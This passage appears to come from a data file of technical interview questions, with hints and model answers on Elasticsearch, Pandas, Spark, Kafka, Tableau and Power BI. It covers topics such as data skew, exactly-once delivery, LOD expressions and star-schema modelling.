      { q:'How does Elasticsearch integrate with the ELK/Elastic Stack?', hint:'Logstash: collect, parse, enrich logs. Beats: lightweight shippers (Filebeat, Metricbeat). Elasticsearch: store and search. Kibana: visualise and explore. APM: application performance monitoring. Fleet for agent management.', answer:`The Elastic Stack is an end-to-end observability platform. Beats are lightweight data shippers installed on servers: Filebeat ships log files, Metricbeat ships system and service metrics, Packetbeat captures network packets, Winlogbeat ships Windows Event Log. Beats send data directly to Elasticsearch or via Logstash for processing. Logstash is a data processing pipeline: inputs (file, syslog, Kafka, HTTP), filters (Grok for log parsing, Mutate for field transformation, GeoIP for enrichment, Date for timestamp parsing), outputs (Elasticsearch, S3, Kafka). Grok patterns parse unstructured log lines into structured fields - an nginx access log becomes individual fields for status code, response time, and client IP. Kibana provides: Discover (ad-hoc log exploration), Visualise/Dashboard (time-series charts, pie charts, maps), Lens (drag-and-drop visualization builder), and Alerting (threshold and anomaly detection alerts). Elastic APM instruments applications (Java agent, Python, Node.js) to capture distributed traces, correlated with logs via the trace ID. Fleet centralises management of multiple Elastic Agents across many hosts.` },
    ],
    pandas: [
      { q:'What is Pandas and how does it differ from NumPy?', hint:'NumPy: arrays, numerical operations, C-level speed. Pandas: DataFrame (table) + Series (column), heterogeneous data types, labels, built on NumPy. Pandas for data manipulation; NumPy for numerical computation.', answer:`NumPy provides n-dimensional arrays of homogeneous data type - all elements must be the same type (float64, int32), enabling C-level vectorised mathematical operations. Pandas builds on NumPy to provide labelled, heterogeneous data structures for data analysis. A DataFrame is a 2D table with column names and row index - columns can have different data types (int64, float64, object/string, datetime). A Series is a single labelled column. Pandas adds powerful operations that NumPy lacks: string operations, datetime handling, groupby aggregations, merging and joining tables, reshaping (pivot, melt), handling missing values, and reading/writing diverse file formats (CSV, Excel, SQL, JSON, Parquet). NumPy is faster for pure numerical computation (matrix operations, linear algebra). Pandas is indispensable for tabular data manipulation, exploratory data analysis, and data pipeline processing. In practice: load data into Pandas, clean and transform it, then pass arrays to NumPy or scikit-learn for numerical algorithms.` },
      { q:'How do you handle missing data in Pandas?', hint:'NaN for float, None for object, pd.NA. isnull()/notnull(). dropna(). fillna(value, method). interpolate(). Impact on operations. dtypes.', answer:`Pandas represents missing data as NaN (Not a Number - a float64 sentinel) for numeric columns, None for object columns, and pd.NA for nullable integer/string/boolean dtypes (introduced to avoid the float promotion problem). df.isnull() returns a boolean DataFrame; df.isnull().sum() counts missing values per column. dropna() removes rows or columns with any/all NaN: df.dropna(axis=0, how='any', subset=['revenue']) drops rows where revenue is NaN. fillna() replaces NaN: df['age'].fillna(df['age'].median()) fills with median; df.fillna(method='ffill') forward-fills with the last valid value - useful for time series. interpolate() fills gaps with interpolated values. Missing value impact: arithmetic with NaN produces NaN (propagates), but aggregations like mean() and sum() skip NaN by default (skipna=True). For string operations, NaN causes errors if not handled. Pandas nullable dtypes (Int64, Float64, StringDtype, BooleanDtype) support pd.NA and avoid float promotion, enabling integer columns with missing values.` },
      { q:'How do you perform groupby operations and aggregations in Pandas?', hint:'groupby(column).agg(). Multiple aggregations: named agg. transform() vs agg(). Multi-column groupby. Pivot tables. Crosstab. Custom aggregation functions.', answer:`GroupBy is Pandas split-apply-combine mechanism. df.groupby('category')['revenue'].sum() groups by category and sums revenue. Multiple aggregations: df.groupby('category').agg({'revenue': 'sum', 'quantity': 'mean', 'customer_id': 'nunique'}) applies different functions per column. Named aggregation: df.groupby('category').agg(total_revenue=('revenue', 'sum'), unique_customers=('customer_id', 'nunique')) produces clean column names. transform() returns a Series aligned to the original index (same length as the original DataFrame) - useful for computing group-level statistics and adding them as a new column: df['revenue_pct'] = df['revenue'] / df.groupby('category')['revenue'].transform('sum'). Custom aggregation functions: .agg(lambda x: x.quantile(0.95)). Pivot tables restructure data: df.pivot_table(values='revenue', index='month', columns='category', aggfunc='sum', fill_value=0). pd.crosstab computes frequency tables. Multi-level groupby: df.groupby(['year', 'category']) creates hierarchical index on results.` },
      { q:'How do you merge and join DataFrames in Pandas?', hint:'pd.merge(): SQL-style joins. How: inner, left, right, outer. On: column name or list. Left_on/right_on for different names. Suffixes for duplicate columns. concat(): stack vertically/horizontally. join(): index-based.', answer:`Pandas merge is equivalent to SQL joins. pd.merge(orders, customers, on='customer_id', how='inner') joins on a common column. how parameter: inner (only matching rows), left (all left rows, NaN for non-matching right), right, outer (all rows from both, NaN for non-matches). When join columns have different names: pd.merge(orders, customers, left_on='cust_id', right_on='id'). Suffixes handle duplicate column names: pd.merge(df1, df2, on='id', suffixes=('_2024', '_2025')). Multi-column join: merge(df1, df2, on=['user_id', 'date']). df.join() is index-based by default - useful when both DataFrames share a meaningful index. pd.concat() stacks DataFrames: concat([df1, df2], axis=0) appends rows (stack vertically); concat([df1, df2], axis=1) appends columns (stack horizontally). ignore_index=True resets the index after concatenation. For large DataFrames, merge is implemented in C and handles millions of rows efficiently - it uses hash joins internally.` },
      { q:'How do you optimise Pandas for large datasets?', hint:'Use appropriate dtypes: int32 vs int64, category for low-cardinality. Chunked reading: chunksize. Dask for parallel. Vectorised operations over loops. avoid iterrows. query() for filtering. Parquet over CSV.', answer:`Pandas loads data into memory - optimising memory and avoiding Python loops are the key levers. Dtype optimisation: df['status'].astype('category') for low-cardinality string columns uses ~10x less memory by encoding unique values as integers with a lookup table. Downcast integers: pd.to_numeric(df['count'], downcast='integer') uses int8/int16 instead of int64. Avoid Python loops entirely - they are 10-100x slower than vectorised operations. Never use iterrows() for processing - use vectorised column operations, apply with numpy functions, or where/np.where for conditionals. Chunked reading: pd.read_csv(file, chunksize=100000) yields chunks - process each chunk and aggregate results for datasets larger than memory. Parquet format is 5-10x smaller than CSV and loads 3-5x faster due to columnar storage and compression - always use Parquet for intermediate storage. query() method: df.query('revenue > 1000 and status == "active"') is faster than boolean indexing for large DataFrames (uses numexpr internally). For truly large datasets (100GB+), use Dask (parallel pandas), Polars (Rust-based, much faster), or move to Spark.` },
      { q:'How do you apply Pandas in a real data pipeline?', hint:'Read from multiple sources (CSV, SQL, API). Clean: rename columns, fix dtypes, handle nulls. Transform: merge, groupby, feature engineering. Validate: assert shapes and ranges. Write to Parquet/DB. Logging. Reproducibility.', answer:`A real Pandas pipeline is structured as discrete, testable stages. Ingest: read from CSV (pd.read_csv with dtype parameter to prevent inference errors), SQL (pd.read_sql_query with SQLAlchemy connection), or API responses (pd.json_normalize for nested JSON). Clean: standardise column names (str.lower().str.replace(' ', '_')), cast to correct dtypes (pd.to_datetime, astype), handle nulls with explicit strategies (fill with median, flag with indicator column, drop if too sparse). Transform: merge multiple DataFrames, compute derived features (df['margin'] = (df['revenue'] - df['cost']) / df['revenue']), groupby aggregations. Validate: assert expected shapes, value ranges, and non-null constraints - pd.testing.assert_frame_equal for regression testing transformations. Output: write to Parquet (df.to_parquet(path, engine='pyarrow', compression='snappy')) for downstream processing, or to SQL with df.to_sql(). I wrap stages in functions with logging for reproducibility and debugging - each function has a clear input/output contract and the pipeline is orchestrated by Airflow or a simple Python script with error handling.` },
    ],
    spark: [
      { q:'Explain the Apache Spark architecture: driver, executors, and the DAG execution model.', hint:'Driver: orchestrates, SparkContext, creates DAG. Cluster manager: YARN/Kubernetes/Standalone. Executors: JVM processes on workers, run tasks. DAG: transformations are lazy, action triggers execution. Stages split at shuffles.', answer:`Spark architecture has a driver program and executor processes. The driver runs the user program, creates a SparkContext/SparkSession, and plans the execution DAG. When the driver submits a job to the cluster manager (YARN, Kubernetes, or Standalone mode), the cluster manager launches Executor JVM processes on worker nodes and allocates CPU and memory. Executors persist for the lifetime of the application, running tasks and caching data in memory or on disk. The DAG execution model is key to Spark performance. Transformations (map, filter, join, groupBy) are lazy - they build up a logical plan without executing. Only an action (count, collect, save, show) triggers execution. Spark optimises the physical plan using the Catalyst Optimizer (for DataFrames/Datasets) and Tungsten execution engine. The DAG is divided into stages at shuffle boundaries (wide transformations like groupByKey, join) - within a stage, tasks run on different partitions in parallel without data movement; between stages, data must be shuffled across the network.` },
      { q:'What is the difference between RDDs, DataFrames, and Datasets in Spark?', hint:'RDD: low-level, untyped, functional API, no optimisation. DataFrame: distributed table, Catalyst optimised, Python/R/Scala/Java, no compile-time type safety. Dataset: typed DataFrame (Scala/Java), encoder-based, best of both.', answer:`RDDs (Resilient Distributed Datasets) are the original Spark API - a fault-tolerant distributed collection of objects. They are untyped (just JVM objects), use functional transformations (map, flatMap, filter, reduceByKey), and bypass the Catalyst Optimizer so Spark cannot optimise them. RDDs are still needed for unstructured data, fine-grained control, or complex operations not expressible in DataFrame API. DataFrames are distributed tables with named columns and schema - identical to Pandas DataFrames conceptually but distributed. The Catalyst Optimizer applies rule-based and cost-based optimisations, and Tungsten generates efficient bytecode. Python and R users have the same performance as Scala since everything compiles to the same optimised physical plan. DataFrames lack compile-time type safety - accessing a non-existent column fails at runtime. Datasets (Scala and Java only) are typed DataFrames - Dataset<Row> is a DataFrame; Dataset<Person> encodes data as typed JVM objects with compile-time safety and IDE support. I use DataFrames/Datasets for structured data and resort to RDDs only for operations the DataFrame API cannot express.` },
      { q:'How do you handle data skew in Spark?', hint:'Skew: some partitions much larger than others. Symptoms: one task runs much longer. Solutions: salting, repartition, broadcast join, AQE, skew join hint.', answer:`Data skew occurs when some partitions have significantly more data than others - in a groupBy or join, one key value (e.g., a popular product or null values) might account for 80% of the data. Symptoms: one task in a stage takes 10x longer than others, visible in the Spark UI stage detail. Solutions: Salting for aggregations - artificially increase key cardinality by appending a random suffix (product_id + "_" + (rand * N)), aggregate, then reduce by the original key. Broadcast join eliminates join-side shuffles entirely for small tables: broadcast(df_small) tells Spark to broadcast the small DataFrame to all executors, avoiding a shuffle. AQE (Adaptive Query Execution, Spark 3.0+) detects skew at runtime and automatically splits large partitions into smaller tasks - enabling automatic skew handling without manual intervention. Skew join hint: spark.sql.adaptive.skewJoin.enabled=true combined with AQE handles join skew. Repartition on a different key distributes data more evenly before expensive operations: df.repartition(200, 'hash_key') where hash_key is a high-cardinality derived column.` },
      { q:'How do you optimise Spark jobs for performance?', hint:'Caching: persist(StorageLevel). Broadcast joins. Partition sizing: 128-200MB per partition. Avoid UDFs (use SQL functions). Coalesce before writes. Serialisation: Kryo. Columnar format: Parquet. AQE. Tungsten.', answer:`Spark optimisation targets the shuffle (the most expensive operation) and memory use. Partition sizing: too few partitions underutilise cores; too many creates scheduling overhead. Target 128-200MB per partition - repartition(numPartitions) or coalesce(n) (coalesce reduces without shuffle). Caching: df.cache() or df.persist(StorageLevel.MEMORY_AND_DISK) stores DataFrames for reuse, avoiding recomputation. Unpersist when done. Broadcast joins: for joins where one DataFrame is small (<10MB by default, configurable via spark.sql.autoBroadcastJoinThreshold), Spark broadcasts automatically - set the threshold higher if you have memory headroom. Avoid Python UDFs - they serialise data to Python, process, and deserialise back, bypassing Tungsten. Use Spark SQL functions (F.regexp_extract, F.date_trunc) or pandas_udf (vectorised via Arrow) instead. Columnar formats: Parquet and ORC store data by column with compression and statistics, enabling partition and predicate pushdown that dramatically reduces bytes read. Kryo serialisation (spark.serializer=org.apache.spark.serializer.KryoSerializer) is 2x faster than Java serialisation for RDDs.` },
      { q:'How does Spark Structured Streaming work?', hint:'Micro-batch (default) or Continuous processing. DataFrame/Dataset API on streaming data. Triggers. Output modes: append, update, complete. Checkpointing for fault tolerance. Watermarking for late data. Kafka source.', answer:`Structured Streaming extends the batch DataFrame API to streaming data using a "continuously updating table" model. A streaming DataFrame is an unbounded table - new rows arrive from sources (Kafka, files, sockets). Transformations are the same as batch: filter, select, groupBy, join with static data. Actions output to sinks (Kafka, files, console, Delta Lake). Triggers control execution frequency: Trigger.ProcessingTime("1 minute") for micro-batch; Trigger.Once() for a one-time batch run; Trigger.Continuous for low-latency continuous processing. Output modes: Append adds only new rows to the sink (for stateless transforms); Update writes updated rows (for aggregations); Complete overwrites the entire result table (for small aggregations). Watermarks handle late-arriving data: withWatermark("timestamp", "10 minutes") declares that data arriving more than 10 minutes late should be discarded - this bounds the state size for windowed aggregations. Checkpointing to HDFS/S3 provides exactly-once fault tolerance by storing offset information and aggregation state - if the query restarts, it resumes from the checkpoint.` },
      { q:'How do you work with Spark and Delta Lake?', hint:'Delta Lake: ACID on object storage. Time travel. Schema enforcement and evolution. MERGE INTO for upserts. Streaming + batch unified. Compaction: OPTIMIZE. Z-Ordering. Vacuum for cleanup.', answer:`Delta Lake adds ACID transactions to Parquet files on cloud storage (S3, ADLS, GCS). The transaction log (_delta_log directory) records every change as a JSON file - this enables ACID properties, time travel, and schema enforcement without a traditional database. Writing to Delta: df.write.format("delta").save(path) or df.write.format("delta").saveAsTable("my_table"). MERGE INTO enables SQL-style upserts - essential for change data capture pipelines: MERGE INTO target USING source ON target.id = source.id WHEN MATCHED THEN UPDATE SET ... WHEN NOT MATCHED THEN INSERT. Time travel: SELECT * FROM my_table VERSION AS OF 5 or TIMESTAMP AS OF '2025-01-15' reads historical versions. Schema enforcement rejects writes with incompatible schema; schema evolution (mergeSchema=true) allows additive schema changes. OPTIMIZE compacts many small files (a common problem with streaming writes) into larger files for faster reads. Z-Ordering co-locates related data for multi-column queries, similar to clustering keys. VACUUM deletes old versions no longer reachable by time travel, reclaiming storage.` },
      { q:'How do you deploy and monitor Spark applications in production?', hint:'Cluster managers: YARN, Kubernetes, Databricks. spark-submit. Spark UI: stages, tasks, executors. History Server. Structured logging. Metrics: Prometheus/Grafana. Auto-scaling. Spot instance strategies.', answer:`Spark production deployment uses spark-submit with configuration parameters: spark-submit --master yarn --deploy-mode cluster --num-executors 10 --executor-memory 8g --executor-cores 4 app.jar. Configuration tuning: set spark.sql.shuffle.partitions (default 200, often too high for small datasets or too low for large ones), spark.default.parallelism, driver and executor memory. Kubernetes deployment uses Spark on Kubernetes mode - driver runs as a pod, executors as pods - with dynamic allocation autoscaling executors based on workload. Spot/preemptible instances reduce cost 70-90% for fault-tolerant batch jobs - configure checkpointing and enable speculative execution to handle node failures. Monitoring: Spark UI (port 4040) shows real-time execution details during job execution. Spark History Server stores completed application UIs. I export Spark metrics to Prometheus via the PrometheusServlet sink and visualise in Grafana - tracking executor utilisation, GC overhead, shuffle read/write bytes, and failed task rate. Structured logging with log4j patterns captures job metadata for debugging. For Databricks, the Jobs UI provides cluster auto-scaling and integrated monitoring.` },
    ],
    kafka: [
      { q:'Explain Kafka architecture: brokers, topics, partitions, producers, and consumers.', hint:'Broker: Kafka server. Topic: logical stream, ordered log. Partitions: horizontal scale, ordered within partition. Producer: writes with key (determines partition). Consumer group: parallel consumption. Offset: position in partition.', answer:`Kafka is a distributed commit log optimised for high-throughput event streaming. A Kafka cluster consists of multiple brokers (servers). Topics are named streams of records, physically divided into partitions - ordered, immutable, append-only logs stored on disk. Producers write records to topics, optionally specifying a key - records with the same key are routed to the same partition (consistent hashing on the key), ensuring ordering for related events (all events for a user or order go to the same partition). Consumer groups provide parallel consumption: partitions are assigned to consumers within the group, with each partition consumed by exactly one consumer at a time - adding consumers scales throughput proportionally to partition count. Offsets are sequential IDs per partition - consumers track their offset to know what they have processed. Multiple consumer groups can read the same topic independently (a Kafka topic is a publish-subscribe log, not a queue). Kafka retains data for a configurable period (7 days default) regardless of consumer status.` },
      { q:'What delivery guarantees does Kafka provide? Explain exactly-once semantics.', hint:'At-most-once: fire and forget. At-least-once: producer retries + consumer commits after processing. Exactly-once: idempotent producer + transactional API. Consumer side: idempotent processing or DB transactions.', answer:`Kafka offers configurable delivery guarantees. At-most-once: producer sends without acknowledgement (acks=0), consumer commits offset before processing - messages may be lost. At-least-once: producer waits for all replica acknowledgement (acks=all), retries on failure - messages are never lost but may be duplicated if a retry succeeds after the original was committed. Consumer commits offset after processing - if the consumer crashes between processing and committing, the message reprocesses on restart. Exactly-once semantics (EOS) requires both producer and consumer cooperation. Idempotent producer (enable.idempotence=true): Kafka assigns sequence numbers to producer records and deduplicates retried records - no duplicates from producer retries. Transactional producer: wraps multiple writes (to multiple topics/partitions) in an atomic transaction - either all commit or none do. Consumer EOS: read-process-write pipelines (Kafka Streams, Flink) commit processed records and write output in the same transaction. For applications consuming from Kafka and writing to external systems (database), idempotent processing design (upsert by ID) is simpler than distributed transactions.` },
      { q:'How do you ensure Kafka high availability and fault tolerance?', hint:'Replication factor: 3 for production. In-sync replicas (ISR). acks=all: only commit when all ISR acknowledge. min.insync.replicas=2. Leader election: controller broker. Unclean leader election: never in prod.', answer:`Kafka fault tolerance relies on replication. Replication factor (default 3) maintains three copies of each partition - one leader and two followers. Producers and consumers always interact with the leader; followers replicate asynchronously. In-Sync Replicas (ISR) are followers that are caught up within a configurable lag threshold. Producer acks=all combined with min.insync.replicas=2 ensures a write is acknowledged only when 2 replicas (including the leader) have confirmed - if the leader fails immediately after, the follower has the data and can become the new leader without data loss. Unclean leader election allows out-of-sync replicas to become leaders - this risks data loss and should always be disabled (unclean.leader.election.enable=false) in production. The controller broker handles partition leader election when a broker fails - ZooKeeper (or KRaft in newer Kafka) coordinates this. For operational availability: distribute partition replicas across availability zones (rack.id config), avoid co-locating too many partition leaders on one broker (leader balancing), and monitor ISR shrinkage as an early warning of replication lag.` },
      { q:'How do you use Kafka Streams for stream processing?', hint:'Kafka Streams: client library, no separate cluster. KStream: record stream. KTable: changelog table. Stateful: aggregations, joins with RocksDB. Topology: processor graph. Interactive queries. State stores.', answer:`Kafka Streams is a client library (no separate processing cluster) that reads from Kafka, processes data using a processor topology, and writes results back to Kafka. KStream represents an unbounded stream of records (every record is an independent event). KTable represents a changelog stream - each record is an update keyed by ID, maintaining the latest value per key (like a database table). Stream-table join: enrich events with reference data by joining a KStream with a KTable - the KTable is materialised locally in RocksDB for fast lookups. Stateful operations (aggregations, windowed aggregations, joins) store state in RocksDB state stores, backed by Kafka changelogs for fault tolerance - if a consumer restarts, it rehydrates state from the changelog topic. Windowed operations: TimeWindows for tumbling/hopping windows; SessionWindows for activity-based sessions. Kafka Streams scales by adding application instances - partitions are rebalanced across instances automatically. Interactive queries allow serving state store data via a REST API, enabling stateful stream processing to power real-time dashboards without an additional database.` },
      { q:'How do you monitor Kafka performance and troubleshoot consumer lag?', hint:'Consumer lag: offset difference between latest and committed. kafka-consumer-groups.sh. JMX metrics: BytesInPerSec, RequestHandlerAvgIdlePercent. Confluent Control Center. Consumer group rebalancing. Under-replicated partitions.', answer:`Consumer lag (the difference between the latest offset and the committed consumer offset) is the primary Kafka health metric - high lag means consumers are falling behind producers. kafka-consumer-groups.sh --describe --group my-group shows lag per partition. For automated monitoring, Kafka exposes JMX metrics: consumer kafka.consumer:type=consumer-fetch-manager-metrics,records-lag-max per partition; broker kafka.server:type=BrokerTopicMetrics,name=BytesInPerSec for throughput; RequestHandlerAvgIdlePercent below 20% indicates an overloaded broker. Under-replicated partitions (kafka.server:type=ReplicaManager,name=UnderReplicatedPartitions > 0) is a critical alert - it means some replicas are falling behind, reducing fault tolerance. Consumer rebalancing storms: frequent rebalances (visible in consumer group state) degrade throughput and indicate heartbeat.interval.ms and max.poll.interval.ms misconfiguration. Increase max.poll.interval.ms if processing takes longer than the default 5 minutes. For real-time dashboards, Confluent Control Center (commercial) or Kafka UI (open source) provide per-topic and per-consumer-group visualisation of lag, throughput, and partition distribution.` },
    ],
    tableau: [
      { q:'What types of visualisations does Tableau support and how do you choose the right one?', hint:'Bar, line, scatter, map, treemap, box plot, heat map. Marks card: size, colour, label, detail. Choose by: comparison (bar), trend (line), distribution (histogram), part-of-whole (pie/treemap), geo (map), correlation (scatter).', answer:`Tableau provides dozens of chart types through the Show Me panel and manual Marks configuration. Choosing the right chart type depends on the analytical question. For comparing discrete categories, bar charts are the default - horizontal bars for long labels. For trends over time, line charts are clearest. For distributions, histograms or box plots reveal spread, outliers, and quartiles. Scatter plots reveal correlation between two measures. Maps are essential for geographic data - filled maps for regional aggregates, symbol maps for point-level data. Treemaps show part-of-whole with a size dimension. Heat maps (text tables with colour) work well for dense cross-tabular comparisons. I avoid pie charts beyond 5 slices and 3D charts entirely - they distort perception. The Marks card (colour, size, shape, label, detail, tooltip) adds dimensions to any chart: colouring a scatter plot by category adds a third dimension to the correlation view. I start with the analytical question ("which regions are declining?") and choose the chart type that answers it most directly.` },
      { q:'Explain Tableau dimensions vs measures and discrete vs continuous fields.', hint:'Dimension: categorical, used for grouping/slicing. Measure: quantitative, aggregated. Discrete (blue): headers, fixed labels. Continuous (green): axis with range. Date can be either. Pill colour signals type.', answer:`Tableau classifies fields as Dimensions (qualitative, used for slicing and labelling - Region, Product Category, Customer Name) or Measures (quantitative, aggregated - Revenue, Quantity, Profit). Dimensions go on Rows/Columns to create headers and group data; Measures go into the view and are aggregated by default (SUM, AVG, COUNT). Discrete vs Continuous is a different axis: Discrete fields (blue pills) create distinct headers or labels - a discrete date shows individual labels (2023, 2024). Continuous fields (green pills) create a quantitative axis with a range - a continuous date shows a timeline axis. Any field can be discrete or continuous regardless of data type - you can make a Measure discrete (SUM(Revenue) as a discrete header) or a Dimension continuous (Customer ID as a continuous axis). Date fields are the most common case for switching: YEAR(OrderDate) as discrete creates separate bars per year; YEAR(OrderDate) as continuous creates a continuous timeline. Understanding this distinction explains most Tableau axis and header behaviour.` },
      { q:'How do you create calculated fields and table calculations in Tableau?', hint:'Calculated field: row-level or aggregate formula. LOD expressions: FIXED, INCLUDE, EXCLUDE. Table calc: computed after aggregation, WINDOW_SUM, RUNNING_SUM, PERCENT OF TOTAL, rank. Quick table calcs.', answer:`Calculated fields extend the data with custom logic. Row-level calculations compute per row before aggregation: [Profit Margin] = [Profit] / [Revenue]. Aggregate calculations operate on aggregated values: SUM([Profit]) / SUM([Revenue]). Level of Detail (LOD) expressions explicitly control the granularity of computation. FIXED: { FIXED [Customer] : SUM([Revenue]) } calculates total revenue per customer regardless of view filters. INCLUDE: { INCLUDE [Product] : SUM([Revenue]) } adds a dimension to the computation even if not in the view. EXCLUDE: { EXCLUDE [Region] : AVG([Revenue]) } removes a dimension from the computation - useful for "compared to overall average" calculations. Table calculations run after aggregation, computed across the result set: RUNNING_SUM, PERCENT OF TOTAL, RANK, LOOKUP, WINDOW_SUM. They are dependent on partitioning (which dimension restarts the calculation) and addressing (the direction of traversal). Quick Table Calculations apply common patterns (Running Total, Percent of Total, Year-over-Year growth) with one click.` },
      { q:'How do you connect Tableau to data sources and optimise performance?', hint:'Live vs extract. Extract (.hyper): faster for large data, offline. Published data source on Tableau Server. Incremental refresh. Data blending for multiple sources. Filters at data source level. Context filters.', answer:`Tableau connects to data via Live connections (query runs against the source in real time - always current but dependent on source performance) or Extracts (.hyper format, locally stored columnar store - much faster than live connections, supports offline viewing). For large datasets, extracts are almost always faster - Tableau Hyper is a columnar in-memory database. Extract refresh: full refresh replaces all data; incremental refresh appends only rows since the last refresh based on a date field. Data Source filters apply before the data reaches the view - push down filters to limit rows in the extract or live query. Context filters run first and limit what other filters compute against, improving performance when a filter significantly reduces data. Multiple data sources: blending uses a secondary data source joined on a linking field - it queries each source independently and blends in Tableau. Cross-database joins (using SQL or custom SQL) are more powerful but less flexible. On Tableau Server, published data sources share refreshed extracts across workbooks - one refresh serves many users.` },
      { q:'How do you build interactive dashboards in Tableau?', hint:'Dashboard actions: filter, highlight, URL, set, parameter change. Container layout: horizontal/vertical. Device designer: responsive layouts. Tooltips: viz in tooltip. Dashboard parameters. Worksheet visibility toggle.', answer:`Tableau dashboards compose multiple worksheets with interactive linking. Dashboard Actions create interactivity: Filter actions run when a user selects marks on one sheet, filtering another sheet to matching data - enables drill-down. Highlight actions colour matching marks across all sheets without filtering - good for showing context while focusing. URL actions open external links with data-driven parameters. Set actions add selected marks to a set, enabling complex "in/out group" comparisons. Parameters are user-controlled inputs (a date range, a metric selector, a threshold) that drive calculations and filters across the entire dashboard. Layout design: I use vertical and horizontal containers to create responsive layouts that reflow correctly at different sizes. Device Designer creates separate layouts for desktop, tablet, and phone. Viz in Tooltip embeds a miniature chart in tooltip hover, adding detail without cluttering the main view. Sheet selector parameters with show/hide sheet actions create tabbed navigation within a single dashboard view, keeping complex analysis in one scrollable surface.` },
      { q:'How do you publish and share Tableau content at scale?', hint:'Tableau Server vs Tableau Online/Cloud. Publish workbook. Content permission model. Row-level security: user filters or data source filters based on username(). Subscriptions: email PDF/PNG on schedule. Embedded analytics via embed code.', answer:`Publishing to Tableau Server or Tableau Cloud makes content accessible via browser without the Tableau Desktop client. Content is organised into Projects (folders with permission inheritance), Workbooks (interactive views), and Data Sources (shared, centrally managed). Permissions: site roles (Creator, Explorer, Viewer) limit what users can do; project and content permissions control who sees what. Row-level security restricts data per user: create a user filter using USERNAME() function - [Region] = USERNAME() and publish with user filters applied, so each user sees only their data. More scalable: a data source filter references a permissions table joining on USERNAME(), filtering at query time without maintaining per-user filters in the workbook. Subscriptions send scheduled email snapshots (PDF or PNG) to stakeholders who do not log in regularly. Tableau Prep Builder handles data preparation pipelines that refresh published data sources on a schedule. For embedding in internal portals or customer-facing applications, Tableau Connected Apps provide secure JWT-based embedding with SSO.` },
      { q:'What is Tableau Prep and how does it fit into a data pipeline?', hint:'Tableau Prep Builder: visual ETL. Profile pane shows data quality. Clean step: rename, filter, split, merge fields. Aggregate, join, union steps. Output: Tableau extract or published data source. Prep Conductor for scheduled flows.', answer:`Tableau Prep Builder is a visual data preparation tool that complements Tableau Desktop. It shows a profile pane with column distributions, null counts, and outliers - making data quality issues immediately visible without writing SQL. Steps in a Prep flow: Input (connect to any data source), Clean (rename fields, fix null values, split strings, merge values using groups and aliases), Aggregate (reduce granularity with groupBy), Join (combine tables with SQL-style join conditions and visual match preview), Union (stack tables vertically), and Output (write to a Hyper extract, a published data source on Tableau Server, or a CSV/database table). Prep flows replace manual SQL or ETL work for analysts who are not comfortable with code. Prep Conductor (part of Tableau Server/Cloud) schedules flows to run on a cadence, automating the data pipeline without external orchestration. For complex pipelines with dependencies, branching logic, or large-scale processing, I use Airflow or dbt and output to a database, then connect Tableau live to the clean tables.` },
    ],
    'power bi': [
      { q:'Explain the Power BI architecture: Desktop, Service, and Gateway.', hint:'Desktop: authoring tool. Service (cloud): publish, share, collaborate. Gateway: connect Service to on-premises data. Import vs DirectQuery vs Live Connection. Dataflows: reusable Power Query ETL in the cloud.', answer:`Power BI has three main components. Power BI Desktop is the Windows authoring application where you connect to data, build the data model, write DAX measures, and create reports. Power BI Service (app.powerbi.com) is the cloud platform for publishing reports, creating dashboards, setting up scheduled refresh, and sharing content. Power BI Gateway is an on-premises software bridge that allows the Service to connect to on-premises SQL Server, Oracle, or files for scheduled refresh and DirectQuery. Data connectivity modes: Import loads data into the VertiPaq in-memory engine - fast query performance, requires scheduled refresh, has a 1GB dataset limit on shared capacity (10GB on Premium). DirectQuery sends queries to the source in real time - always current but dependent on source performance and has query limitations. Live Connection connects to Analysis Services or Power BI Premium datasets - similar to DirectQuery but the model is managed elsewhere. Dataflows are reusable Power Query ETL definitions in the Service - multiple reports share the same transformation logic, reducing duplication.` },
      { q:'What is DAX and how does it differ from Power Query (M)?', hint:'DAX: analytical language for measures and calculated columns. Operates on tables/columns. Evaluation context: row context vs filter context. Power Query (M): ETL language for data transformation at load time. DAX at query time; M at load time.', answer:`Power Query (M language) runs at data load time - it defines the transformation steps to clean, reshape, and combine data before it enters the model. M is a functional language for ETL: filter rows, rename columns, split fields, merge tables, change data types. Changes require a refresh to take effect. DAX (Data Analysis Expressions) runs at query time - it computes measures and calculated columns against the loaded model. DAX is an analytical language designed for aggregations and filter manipulation. The critical DAX concept is evaluation context: row context (which row is currently being evaluated in a calculated column) and filter context (what filters are active when a measure is evaluated). CALCULATE() is the most important DAX function - it changes the filter context: CALCULATE(SUM(Sales[Revenue]), REMOVEFILTERS(Date[Year])) computes total revenue across all years regardless of any year filter on the visual. I build transformations in Power Query (M) and calculations in DAX - never compute metrics in M that could be DAX measures, as measures respond to report filters dynamically.` },
      { q:'How do you model data in Power BI? Explain star schema and relationships.', hint:'Star schema: fact table (transactions) + dimension tables (date, product, customer). Relationships: single active, cardinality (1:M typical). Avoid bidirectional unless necessary. Calculated tables. Role-playing dimensions.', answer:`Power BI data modelling follows the star schema pattern from data warehousing. A central fact table (Sales, Orders, Events) holds transactional records with foreign keys and numeric measures. Dimension tables (Date, Product, Customer, Geography) hold descriptive attributes. This structure optimises DAX calculations and filter propagation. Relationships connect tables on matching keys: a 1-to-many relationship from DimDate[DateKey] to FactSales[OrderDate] allows filtering the fact table by any date attribute. Relationships are single-directional by default - filters flow from the "one" side to the "many" side. Bidirectional filtering allows filters to flow both ways but can create ambiguity and circular paths - use only when genuinely needed. Role-playing dimensions: if FactSales has OrderDate and ShipDate both referencing DimDate, only one can be the active relationship. For the inactive one, use USERELATIONSHIP() in DAX to activate it in specific measures: CALCULATE(SUM(Sales), USERELATIONSHIP(FactSales[ShipDate], DimDate[DateKey])). Calculated tables in DAX create model tables from expressions - useful for creating date tables: CALENDAR(MIN(Sales[OrderDate]), MAX(Sales[OrderDate])).` },
